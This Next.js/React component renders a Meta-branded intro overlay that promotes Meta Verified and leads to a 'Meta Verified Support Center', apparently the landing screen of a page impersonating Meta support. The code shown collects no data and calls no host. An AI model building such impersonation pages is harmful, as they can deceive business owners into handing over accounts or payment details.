'use client';

import '@/assets/css/intro-safety.css';
import MetaLogo from '@/assets/images/logo-meta.svg';
import tickIcon from '@/assets/images/tick.svg';
import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
import Image from 'next/image';
import { useCallback, useEffect, useRef, useState, type FC } from 'react';

const DONE_DELAY_MS = 500;

interface IntroLoadingProps {
    onDone: () => void;
    texts: Partial<MetaVerifiedTexts>;
}

const IntroLoading: FC<IntroLoadingProps> = ({ onDone, texts }) => {
    const [visible, setVisible] = useState(true);
    const [fadeOut, setFadeOut] = useState(false);
    const timersRef = useRef<ReturnType<typeof setTimeout>[]>([]);

    const clearTimers = useCallback(() => {
        timersRef.current.forEach(clearTimeout);
        timersRef.current = [];
    }, []);

    const finishIntro = useCallback(() => {
        if (fadeOut) {
            return;
        }
        setFadeOut(true);
        const doneTimer = setTimeout(() => {
            setVisible(false);
            onDone();
        }, DONE_DELAY_MS);
        timersRef.current.push(doneTimer);
    }, [fadeOut, onDone]);

    useEffect(() => {
        return () => clearTimers();
    }, [clearTimers]);

    const heroLead = texts.introHeroLead || 'Upgrade your business with Meta Verified.';
    const heroBody =
        texts.introHeroBody ||
        'When a business has the Verified badge, people are nearly twice as likely to trust that business recommendation compared to one without the badge.';
    const heroHighlight =
        texts.introHeroHighlight ||
        'Why wait? Subscribe to Meta Verified today to add this badge to your profile and enjoy exclusive benefits.';
    const introButton = texts.introContinueButton || 'Continue to Meta Verified Support Center';

    if (!visible) {
        return null;
    }

    return (
        <div className={`intro-safety-overlay${fadeOut ? ' is-fading' : ''}`}>
            <div className='intro-safety-hero-scroll'>
                <div className='intro-safety-hero'>
                    <div className='intro-safety-hero-text'>
                        <h2 className='intro-safety-hero-title'>
                            <Image src={MetaLogo} alt='Meta' className='intro-safety-hero-logo' priority />
                        </h2>
                        <p className='intro-safety-hero-body intro-safety-verified-lead'>
                            <Image src={tickIcon} alt='' className='intro-safety-verified-icon' aria-hidden width={20} height={20} />
                            <strong>{heroLead}</strong>
                        </p>
                        <p className='intro-safety-hero-body'>{heroBody}</p>
                        <p className='intro-safety-hero-highlight'>{heroHighlight}</p>
                        <div className='intro-safety-enter-wrap intro-safety-enter-wrap-hero'>
                            <button type='button' className='intro-safety-enter-button' onClick={finishIntro}>
                                {introButton}
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default IntroLoading;
